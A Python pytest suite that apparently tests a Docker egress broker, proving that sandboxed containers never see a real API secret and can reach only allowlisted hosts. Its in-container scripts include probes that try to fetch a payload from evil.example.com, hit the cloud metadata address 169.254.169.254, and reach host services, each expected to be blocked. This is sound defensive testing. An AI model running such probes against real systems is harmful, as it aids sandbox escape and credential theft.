"""Adversarial end-to-end tests for Docker virtual egress.

These prove *non-possession*: the container never receives the real secret, cannot
reach the provider directly, and the credential dies with the session. They spin
real containers, so they are gated on a responsive Docker daemon.
"""

from __future__ import annotations

import asyncio
import contextlib
import http.server
import json
import os
import secrets
import shutil
import socket
import subprocess
import threading

import httpx
import pytest
from tests.egress_conformance import (
    EgressScenarioEvidence,
    egress_nightly_failure_boundary,
    emit_egress_nightly_evidence,
    registration_for,
)
from tests.egress_e2e_support import CapturingEgressAdapter, drive_adversarial_egress_contract

from cayu.egress import (
    ApprovedEgressDestination,
    CapturedRequest,
    CapturedResponse,
    EgressUpstreamLimits,
    EgressUpstreamOperation,
    HttpEgressPolicy,
)
from cayu.runners.base import ExecCommand
from cayu.vaults import SecretRef, StaticVault

pytest.importorskip("cryptography")

from cayu.egress.docker_adapter import DockerEgressAdapter
from cayu.workspaces import RunnerWorkspace

REAL_SECRET = "sk_test_51E2ERealSecretNeverInContainer"
CONTAINER_IMAGE = "python:3.12-slim"


def _docker_available() -> bool:
    if not shutil.which("docker"):
        return False
    try:
        result = subprocess.run(
            ["docker", "info"],
            capture_output=True,
            timeout=15,
        )
    except (OSError, subprocess.TimeoutExpired):
        return False
    return result.returncode == 0


_DOCKER_AVAILABLE = _docker_available()
if os.environ.get("CAYU_REQUIRE_DOCKER_EGRESS") == "1" and not _DOCKER_AVAILABLE:
    raise RuntimeError("CAYU_REQUIRE_DOCKER_EGRESS=1 but the Docker daemon is unavailable.")

pytestmark = [
    pytest.mark.process,
    pytest.mark.skipif(
        not _DOCKER_AVAILABLE,
        reason="Docker daemon not available for virtual-egress E2E.",
    ),
]


class _FakeStripe:
    """Stands in for api.stripe.com so the E2E needs no real Stripe key."""

    def __init__(self) -> None:
        self.upstream_authorization: str | None = None

    def prepare(
        self,
        request: CapturedRequest,
        *,
        limits: EgressUpstreamLimits,
    ) -> EgressUpstreamOperation:
        assert limits.max_response_bytes > 0

        async def send() -> CapturedResponse:
            self.upstream_authorization = request.headers.get("Authorization")
            return CapturedResponse(
                status_code=200,
                headers={"Request-Id": "req_e2e"},
                body=b'{"id":"cus_fake123","object":"customer"}',
            )

        return EgressUpstreamOperation(send)


def _stripe_example_policy() -> HttpEgressPolicy:
    return HttpEgressPolicy(
        name="stripe-example",
        allowed_hosts=["api.stripe.com"],
        allowed_endpoints=[("POST", "/v1/customers")],
    )


async def _drive() -> tuple[EgressScenarioEvidence, ...]:
    return await drive_adversarial_egress_contract(
        registration=registration_for("docker"),
        adapter=CapturingEgressAdapter(DockerEgressAdapter(loop=asyncio.get_running_loop())),
        real_secret=REAL_SECRET,
        image=CONTAINER_IMAGE,
        search_roots=("/workspace", "/tmp", "/etc/cayu", "/root"),
        response_id="cus_fake123",
        workspace_factory=RunnerWorkspace,
    )


@pytest.fixture(scope="module")
def e2e_results() -> tuple[EgressScenarioEvidence, ...]:
    with egress_nightly_failure_boundary("docker"):
        return asyncio.run(_drive())


def test_shared_real_boundary_security_contract(
    e2e_results: tuple[EgressScenarioEvidence, ...],
) -> None:
    with egress_nightly_failure_boundary("docker"):
        assert {item.scenario for item in e2e_results} == {
            "brokered-provider-and-session-ca",
            "guest-network-bypass-denial",
            "guest-secret-non-possession",
        }
        assert all(item.adapter == "docker" for item in e2e_results)
        assert all(item.status == "verified" for item in e2e_results)
        assert REAL_SECRET not in repr(e2e_results)
        emit_egress_nightly_evidence(e2e_results)


@pytest.mark.parametrize(
    ("network", "authenticated"), [("bridge", True), ("none", True), ("bridge", False)]
)
def test_sidecar_probe_requires_a_real_authenticated_broker_route(network, authenticated) -> None:
    from cayu.egress import (
        TransparentEgressBroker,
        UnsupportedEgressError,
        VirtualCredentialRegistry,
    )
    from cayu.egress.docker_adapter import (
        _SIDECAR_AUTH_PATH,
        _SIDECAR_CONNECTOR_PATH,
        _create_sidecar_transport_authorization,
        _default_docker_exec,
    )
    from cayu.egress.proxy_server import TransparentEgressProxyServer

    async def run():
        decisions = []
        broker = TransparentEgressBroker(
            registry=VirtualCredentialRegistry(), resolver=None, policies={}, audit=decisions.append
        )
        authorization = _create_sidecar_transport_authorization()
        adapter = DockerEgressAdapter()
        bind_host = await adapter._proxy_bind_host_resolver()
        server = TransparentEgressProxyServer(
            broker,
            loop=asyncio.get_running_loop(),
            host=bind_host,
            transport_auth_token=authorization.token if authenticated else b"different-identity",
        )
        sidecar = f"cayu-test-broker-probe-{secrets.token_hex(6)}"
        try:
            port = await server.start()
            code, stderr = await _default_docker_exec(
                [
                    "run",
                    "-d",
                    "--name",
                    sidecar,
                    "--network",
                    network,
                    "--add-host",
                    "host.docker.internal:host-gateway",
                    "--mount",
                    f"type=bind,src={authorization.auth_path},dst={_SIDECAR_AUTH_PATH},readonly",
                    "--mount",
                    f"type=bind,src={authorization.connector_path},dst={_SIDECAR_CONNECTOR_PATH},readonly",
                    "--env",
                    f"CAYU_BROKER_PORT={port}",
                    "--entrypoint",
                    "sleep",
                    "alpine/socat",
                    "60",
                ]
            )
            assert code == 0, stderr
            if network == "none" or not authenticated:
                with pytest.raises(UnsupportedEgressError, match="egress_sidecar_unreachable"):
                    await adapter._probe_sidecar_broker(sidecar, bind_host=bind_host, broker=broker)
                assert len(decisions) == 1
                assert decisions[0].error_code == "egress_sidecar_unreachable"
            else:
                await adapter._probe_sidecar_broker(sidecar, bind_host=bind_host, broker=broker)
                assert decisions == []
        finally:
            try:
                code, stderr = await _default_docker_exec(["rm", "-f", sidecar])
                assert code == 0, stderr
            finally:
                await server.close()
                authorization.close()

    asyncio.run(run())


# --- Full runtime wiring: the VirtualEgressEnvironmentFactory lifecycle. ---


async def _drive_factory() -> dict[str, object]:
    from cayu.egress.runtime import VirtualCredentialSpec, VirtualEgressEnvironmentFactory
    from cayu.environments import EnvironmentFactoryRequest
    from cayu.events import Event, EventType

    events: list[Event] = []
    authorized_seen = asyncio.Event()

    async def emitter(event: Event) -> Event:
        events.append(event)
        if event.type == EventType.EGRESS_REQUEST_AUTHORIZED:
            authorized_seen.set()
        return event

    upstream = _FakeStripe()
    factory = VirtualEgressEnvironmentFactory(
        resolver=StaticVault({"stripe_test_key": REAL_SECRET}),
        policies={"stripe-example": _stripe_example_policy()},
        credentials=[
            VirtualCredentialSpec(
                env_name="STRIPE_SECRET_KEY",
                secret=SecretRef(name="stripe_test_key"),
                destination="api.stripe.com",
                policy_name="stripe-example",
            )
        ],
        runner_kind="docker",
        image=CONTAINER_IMAGE,
        event_emitter=emitter,
        upstream=upstream,
    )
    request = EnvironmentFactoryRequest(
        session_id="e2e-factory", agent_name="agent", environment_name="egress-env"
    )
    result = await factory.create(request)
    runner = result.environment.runner
    assert runner is not None

    call_script = (
        "import os, urllib.request as u\n"
        "req = u.Request('https://api.stripe.com/v1/customers', data=b'email=a@b.co',\n"
        "    headers={'Authorization': 'Bearer ' + os.environ['STRIPE_SECRET_KEY']})\n"
        "print(u.urlopen(req, timeout=25).read().decode())\n"
    )
    try:
        call = await runner.exec(ExecCommand.process("python3", "-c", call_script), timeout_s=60)
        await asyncio.wait_for(authorized_seen.wait(), timeout=2)
    finally:
        bound = await result.environment.binding.bind(None, runner, session_id="e2e-factory")
        await result.environment.binding.finalize(bound, outcome="completed")

    return {
        "call_stdout": call.stdout,
        "upstream_authorization": upstream.upstream_authorization,
        "event_types": [str(e.type) for e in events],
        "event_payloads": " ".join(str(e.payload) for e in events),
        "authorized": EventType.EGRESS_REQUEST_AUTHORIZED,
        "minted": EventType.EGRESS_GRANT_MINTED,
        "revoked": EventType.EGRESS_GRANT_REVOKED,
    }


@pytest.fixture(scope="module")
def factory_results() -> dict[str, object]:
    return asyncio.run(_drive_factory())


def test_factory_allowed_call_succeeds_with_swap(factory_results: dict[str, object]) -> None:
    assert "cus_fake123" in str(factory_results["call_stdout"])
    assert REAL_SECRET not in str(factory_results["call_stdout"])
    assert factory_results["upstream_authorization"] == f"Bearer {REAL_SECRET}"


def test_factory_emits_audit_events_without_secret(factory_results: dict[str, object]) -> None:
    types = factory_results["event_types"]
    assert str(factory_results["minted"]) in types
    assert str(factory_results["authorized"]) in types
    assert str(factory_results["revoked"]) in types
    assert REAL_SECRET not in str(factory_results["event_payloads"])


async def _drive_credentialless_factory() -> dict[str, object]:
    from cayu.egress.runtime import VirtualEgressEnvironmentFactory
    from cayu.environments import EnvironmentFactoryRequest
    from cayu.events import Event, EventType

    endpoint_requests: list[dict[str, str]] = []

    class _DocsHandler(http.server.BaseHTTPRequestHandler):
        def do_GET(self) -> None:
            endpoint_requests.append(
                {
                    "path": self.path,
                    "authorization": self.headers.get("Authorization", ""),
                }
            )
            body = b'{"docs":"bounded"}'
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, _format: str, *_args: object) -> None:
            return

    endpoint = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _DocsHandler)
    endpoint_thread = threading.Thread(target=endpoint.serve_forever, daemon=True)
    endpoint_thread.start()

    class _PublicDocs:
        def __init__(self) -> None:
            self.requests: list[CapturedRequest] = []

        def prepare(
            self,
            request: CapturedRequest,
            *,
            limits: EgressUpstreamLimits,
        ) -> EgressUpstreamOperation:
            async def send() -> CapturedResponse:
                self.requests.append(request)
                async with httpx.AsyncClient(timeout=limits.total_timeout_s) as client:
                    response = await client.request(
                        request.method,
                        f"http://127.0.0.1:{endpoint.server_port}{request.path}",
                        content=request.body,
                    )
                if len(response.content) > limits.max_response_bytes:
                    raise RuntimeError("Test upstream response exceeded its byte limit.")
                return CapturedResponse(
                    status_code=response.status_code,
                    headers=dict(response.headers),
                    body=response.content,
                )

            async def cancel_and_wait(task: asyncio.Task[CapturedResponse]) -> None:
                task.cancel()
                with contextlib.suppress(BaseException):
                    await task

            return EgressUpstreamOperation(send, cancel_and_wait=cancel_and_wait)

    events: list[Event] = []

    async def emitter(event: Event) -> Event:
        events.append(event)
        return event

    upstream = _PublicDocs()
    factory = VirtualEgressEnvironmentFactory(
        policies={
            "public-docs": HttpEgressPolicy(
                name="public-docs",
                allowed_hosts=["docs.example.com"],
                allowed_endpoints=[("GET", "/sdk/index.json")],
            )
        },
        approved_destinations=[
            ApprovedEgressDestination(
                destination="docs.example.com",
                policy_name="public-docs",
            )
        ],
        credentials=[],
        runner_kind="docker",
        image=CONTAINER_IMAGE,
        event_emitter=emitter,
        upstream=upstream,
    )
    try:
        result = await factory.create(
            EnvironmentFactoryRequest(
                session_id="e2e-credentialless",
                agent_name="agent",
                environment_name="egress-env",
            )
        )
        runner = result.environment.runner
        binding = result.environment.binding
        assert runner is not None
        assert binding is not None
        script = (
            "import socket, urllib.error, urllib.request as u\n"
            "print(u.urlopen('https://docs.example.com/sdk/index.json', timeout=25).read().decode())\n"
            "try:\n"
            "    u.urlopen('https://evil.example.com/payload', timeout=25)\n"
            "except urllib.error.HTTPError as exc:\n"
            "    print('denied', exc.code)\n"
            "except urllib.error.URLError as exc:\n"
            "    if 'Tunnel connection failed: 403 Forbidden' not in str(exc.reason): raise\n"
            "    print('denied', 403)\n"
            "def blocked(host, port):\n"
            "    try:\n"
            "        socket.create_connection((host, port), timeout=2).close()\n"
            "        return False\n"
            "    except OSError:\n"
            "        return True\n"
            "print('direct-ip-denied', blocked('1.1.1.1', 443))\n"
            "print('metadata-denied', blocked('169.254.169.254', 80))\n"
        )
        try:
            call = await runner.exec(ExecCommand.process("python3", "-c", script), timeout_s=60)
            egress_binding = runner._egress_binding
            assert egress_binding.sidecar is not None
            assert egress_binding.proxy_port is not None
            proxy_bind_host = str(egress_binding.metadata["proxy_bind_host"])

            def direct_broker_rejected() -> bool:
                connect_host = "127.0.0.1" if proxy_bind_host == "0.0.0.0" else proxy_bind_host
                try:
                    with socket.create_connection(
                        (connect_host, egress_binding.proxy_port), timeout=5
                    ) as connection:
                        connection.sendall(
                            b"CONNECT docs.example.com:443 HTTP/1.1\r\n"
                            b"Host: docs.example.com:443\r\n\r\n"
                        )
                        return not connection.recv(1024).startswith(b"HTTP/1.1 200")
                except OSError:
                    return True

            def default_bridge_peer_rejected() -> bool:
                inspection = subprocess.run(
                    [
                        "docker",
                        "inspect",
                        "--format",
                        '{{(index .NetworkSettings.Networks "bridge").IPAddress}}',
                        egress_binding.sidecar,
                    ],
                    check=True,
                    capture_output=True,
                    text=True,
                    timeout=15,
                )
                sidecar_default_ip = inspection.stdout.strip()
                probe = subprocess.run(
                    [
                        "docker",
                        "run",
                        "--rm",
                        "--network",
                        "bridge",
                        CONTAINER_IMAGE,
                        "python3",
                        "-c",
                        (
                            "import socket,sys; "
                            "sock=socket.socket(); sock.settimeout(3); "
                            "\ntry: sock.connect((sys.argv[1],8080))\n"
                            "except OSError: raise SystemExit(0)\n"
                            "else: sock.close(); raise SystemExit(1)"
                        ),
                        sidecar_default_ip,
                    ],
                    capture_output=True,
                    timeout=30,
                )
                return probe.returncode == 0

            direct_broker_denied = await asyncio.to_thread(direct_broker_rejected)
            default_bridge_peer_denied = await asyncio.to_thread(default_bridge_peer_rejected)
        finally:
            bound = await binding.bind(None, runner, session_id="e2e-credentialless")
            await binding.finalize(bound, outcome="completed")
    finally:
        endpoint.shutdown()
        endpoint.server_close()
        endpoint_thread.join(timeout=5)
    return {
        "exit_code": call.exit_code,
        "timed_out": call.timed_out,
        "stdout": call.stdout,
        "stderr": call.stderr,
        "requests": upstream.requests,
        "endpoint_requests": endpoint_requests,
        "events": events,
        "direct_broker_denied": direct_broker_denied,
        "default_bridge_peer_denied": default_bridge_peer_denied,
        "authorized": EventType.EGRESS_REQUEST_AUTHORIZED,
        "denied": EventType.EGRESS_REQUEST_DENIED,
    }


@pytest.fixture(scope="module")
def credentialless_factory_results() -> dict[str, object]:
    return asyncio.run(_drive_credentialless_factory())


def test_credentialless_factory_crosses_real_docker_boundary_without_fake_secret(
    credentialless_factory_results: dict[str, object],
) -> None:
    assert credentialless_factory_results["exit_code"] == 0
    assert credentialless_factory_results["timed_out"] is False
    assert '{"docs":"bounded"}' in str(credentialless_factory_results["stdout"])
    assert "denied 403" in str(credentialless_factory_results["stdout"])
    assert "direct-ip-denied True" in str(credentialless_factory_results["stdout"])
    assert "metadata-denied True" in str(credentialless_factory_results["stdout"])
    assert credentialless_factory_results["direct_broker_denied"] is True
    assert credentialless_factory_results["default_bridge_peer_denied"] is True
    requests = credentialless_factory_results["requests"]
    assert isinstance(requests, list)
    assert len(requests) == 1
    assert "authorization" not in {
        key.lower()
        for key in requests[0].headers  # type: ignore[union-attr]
    }
    assert credentialless_factory_results["endpoint_requests"] == [
        {"path": "/sdk/index.json", "authorization": ""}
    ]
    events = credentialless_factory_results["events"]
    assert isinstance(events, list)
    request_events = [
        event
        for event in events
        if event.type
        in {
            credentialless_factory_results["authorized"],
            credentialless_factory_results["denied"],
        }
    ]
    assert request_events
    assert any(
        event.type is credentialless_factory_results["authorized"] for event in request_events
    )
    for event in request_events:
        if event.payload["method"] == "CONNECT":
            assert event.type is credentialless_factory_results["denied"]
            assert event.payload["authorization_kind"] == "transport"
        else:
            assert event.payload["authorization_kind"] == "credentialless"


_HTTP_REACH_SCRIPT = """
import socket, sys, time
host, port = sys.argv[1].rsplit(":", 1)
deadline = time.monotonic() + 20
while True:
    try:
        with socket.create_connection((host, int(port)), timeout=3) as connection:
            connection.sendall(b"GET / HTTP/1.0\\r\\n\\r\\n")
            print("reachable" if connection.recv(12).startswith(b"HTTP/1.0 200") else "other")
            break
    except OSError:
        if time.monotonic() > deadline:
            print("unreachable")
            break
        time.sleep(0.5)
"""


@contextlib.contextmanager
def _engine_host_listener():
    """Serve HTTP on all interfaces of the Docker engine's host, like a host service.

    Yields the port and the default bridge gateway, through which an ordinary
    container does reach the listener.
    """

    name = f"cayu-test-host-listener-{secrets.token_hex(6)}"
    port = 20000 + secrets.randbelow(20000)
    started = subprocess.run(
        [
            "docker",
            "run",
            "-d",
            "--rm",
            "--name",
            name,
            "--network",
            "host",
            CONTAINER_IMAGE,
            "python3",
            "-m",
            "http.server",
            str(port),
            "--bind",
            "0.0.0.0",
        ],
        capture_output=True,
        text=True,
        timeout=120,
    )
    assert started.returncode == 0, started.stderr
    try:
        gateway = subprocess.run(
            [
                "docker",
                "network",
                "inspect",
                "bridge",
                "--format",
                "{{range .IPAM.Config}}{{.Gateway}} {{end}}",
            ],
            check=True,
            capture_output=True,
            text=True,
            timeout=15,
        ).stdout.split()[0]
        control = subprocess.run(
            [
                "docker",
                "run",
                "--rm",
                "--network",
                "bridge",
                CONTAINER_IMAGE,
                "python3",
                "-c",
                _HTTP_REACH_SCRIPT,
                f"{gateway}:{port}",
            ],
            capture_output=True,
            text=True,
            timeout=120,
        )
        # Without this control a blocked result would prove nothing.
        assert control.stdout.strip() == "reachable", (control.stdout, control.stderr)
        yield port, gateway
    finally:
        subprocess.run(["docker", "rm", "-f", name], capture_output=True, timeout=60)


async def _drive_hardened_factory(host_port: int, bridge_gateway: str) -> dict[str, object]:
    from cayu.egress.runtime import VirtualEgressEnvironmentFactory
    from cayu.environments import EnvironmentFactoryRequest
    from cayu.runners.docker_workload import DockerWorkloadRestrictions

    class _Index:
        def prepare(
            self,
            request: CapturedRequest,
            *,
            limits: EgressUpstreamLimits,
        ) -> EgressUpstreamOperation:
            del request, limits

            async def send() -> CapturedResponse:
                return CapturedResponse(status_code=200, headers={}, body=b"index-ok")

            return EgressUpstreamOperation(send)

    adapter = DockerEgressAdapter(workload_restrictions=DockerWorkloadRestrictions())
    factory = VirtualEgressEnvironmentFactory(
        policies={
            "index": HttpEgressPolicy(
                name="index",
                allowed_hosts=["pypi.example.com"],
                allowed_endpoints=[("GET", "/simple/")],
            )
        },
        approved_destinations=[
            ApprovedEgressDestination(destination="pypi.example.com", policy_name="index")
        ],
        adapter=adapter,
        image=CONTAINER_IMAGE,
        upstream=_Index(),
    )
    result = await factory.create(
        EnvironmentFactoryRequest(
            session_id="e2e-hardened",
            agent_name="agent",
            environment_name="hardened-env",
        )
    )
    runner = result.environment.runner
    binding = result.environment.binding
    assert runner is not None
    assert binding is not None
    script = (
        "import os, socket, urllib.error, urllib.request as u\n"
        "print('uid', os.getuid(), os.getgid())\n"
        "status = dict(line.split(':\\t', 1) for line in open('/proc/self/status'))\n"
        "print('caps', status['CapEff'].strip(), 'nnp', status['NoNewPrivs'].strip())\n"
        "def writable(path):\n"
        "    try:\n"
        "        open(path, 'w').close()\n"
        "        return True\n"
        "    except OSError:\n"
        "        return False\n"
        "print('root-writable', writable('/etc/cayu-probe'))\n"
        "print('workspace-writable', writable('/workspace/probe'))\n"
        "print(u.urlopen('https://pypi.example.com/simple/', timeout=25).read().decode())\n"
        "try:\n"
        "    u.urlopen('https://canary.example.com/', timeout=25)\n"
        "except urllib.error.HTTPError as exc:\n"
        "    print('denied', exc.code)\n"
        "except urllib.error.URLError as exc:\n"
        "    if 'Tunnel connection failed: 403 Forbidden' not in str(exc.reason): raise\n"
        "    print('denied', 403)\n"
        "try:\n"
        "    socket.create_connection(('1.1.1.1', 443), timeout=2).close()\n"
        "    print('direct-ip-denied', False)\n"
        "except OSError:\n"
        "    print('direct-ip-denied', True)\n"
        # The address Docker gives the host on a network (its gateway, the
        # first address of the subnet) and the default bridge gateway.
        "import ipaddress, struct\n"
        "targets = []\n"
        "for line in open('/proc/net/route').read().splitlines()[1:]:\n"
        "    fields = line.split()\n"
        "    if fields[1] == '00000000':\n"
        "        print('default-route', fields[0])\n"
        "        continue\n"
        "    address, mask = (struct.pack('<L', int(value, 16)) for value in (fields[1], fields[7]))\n"
        "    subnet = ipaddress.IPv4Network((ipaddress.IPv4Address(address), "
        "bin(int.from_bytes(mask, 'big')).count('1')))\n"
        "    targets.append(str(subnet.network_address + 1))\n"
        f"targets += [{bridge_gateway!r}, 'host.docker.internal']\n"
        "for target in targets:\n"
        "    try:\n"
        f"        connection = socket.create_connection((target, {host_port}), timeout=3)\n"
        "        connection.sendall(b'GET / HTTP/1.0\\r\\n\\r\\n')\n"
        "        reached = connection.recv(12).startswith(b'HTTP/1.0 200')\n"
        "        connection.close()\n"
        "    except OSError:\n"
        "        reached = False\n"
        "    print('host-denied', target, not reached)\n"
    )
    try:
        call = await runner.exec(ExecCommand.process("python3", "-c", script), timeout_s=90)
        evidence = runner.execution_admission_candidate().evidence
        network_name = runner._egress_binding.network
        assert network_name is not None
        network = json.loads(
            subprocess.run(
                ["docker", "network", "inspect", "--format", "{{json .}}", network_name],
                check=True,
                capture_output=True,
                text=True,
                timeout=15,
            ).stdout
        )
    finally:
        bound = await binding.bind(None, runner, session_id="e2e-hardened")
        await binding.finalize(bound, outcome="completed")
    return {"call": call, "evidence": evidence, "network": network}


def test_hardened_container_reaches_only_allowlisted_hosts() -> None:
    with _engine_host_listener() as (host_port, bridge_gateway):
        results = asyncio.run(_drive_hardened_factory(host_port, bridge_gateway))
    call = results["call"]
    assert call.exit_code == 0, call.stderr
    stdout = call.stdout
    assert "uid 1000 1000" in stdout
    assert "caps 0000000000000000 nnp 1" in stdout
    assert "root-writable False" in stdout
    assert "workspace-writable True" in stdout
    assert "index-ok" in stdout
    assert "denied 403" in stdout
    assert "direct-ip-denied True" in stdout
    # A host service listening on every interface is out of reach: the network
    # has no gateway, so the host has no address the guest can route to.
    assert "default-route" not in stdout
    host_lines = [line for line in stdout.splitlines() if line.startswith("host-denied ")]
    assert len(host_lines) >= 3, stdout
    assert all(line.endswith(" True") for line in host_lines), stdout
    network = results["network"]
    assert network["Internal"] is True
    assert all(not config.get("Gateway") for config in network["IPAM"]["Config"])
    evidence = results["evidence"]
    assert evidence.state_for("unprivileged_guest") == "available"
    assert evidence.state_for("untrusted_code_isolation") == "unsupported"


@pytest.mark.parametrize("listening", [True, False])
def test_host_isolation_probe_detects_a_reachable_host(listening) -> None:
    from cayu.egress import UnsupportedEgressError

    name = f"cayu-test-host-probe-guest-{secrets.token_hex(6)}"
    with _engine_host_listener() as (host_port, bridge_gateway):
        started = subprocess.run(
            [
                "docker",
                "run",
                "-d",
                "--name",
                name,
                "--network",
                "bridge",
                "--entrypoint",
                "sleep",
                "alpine/socat",
                "120",
            ],
            capture_output=True,
            text=True,
            timeout=120,
        )
        assert started.returncode == 0, started.stderr
        try:
            # A container on the default bridge reaches the host through its
            # gateway, whether or not the port has a listener.
            target = f"{bridge_gateway}:{host_port if listening else 1}"
            with pytest.raises(UnsupportedEgressError, match=r"\(host_reachable\)"):
                asyncio.run(
                    DockerEgressAdapter()._probe_host_isolation(started.stdout.strip(), [target])
                )
        finally:
            subprocess.run(["docker", "rm", "-f", name], capture_output=True, timeout=60)
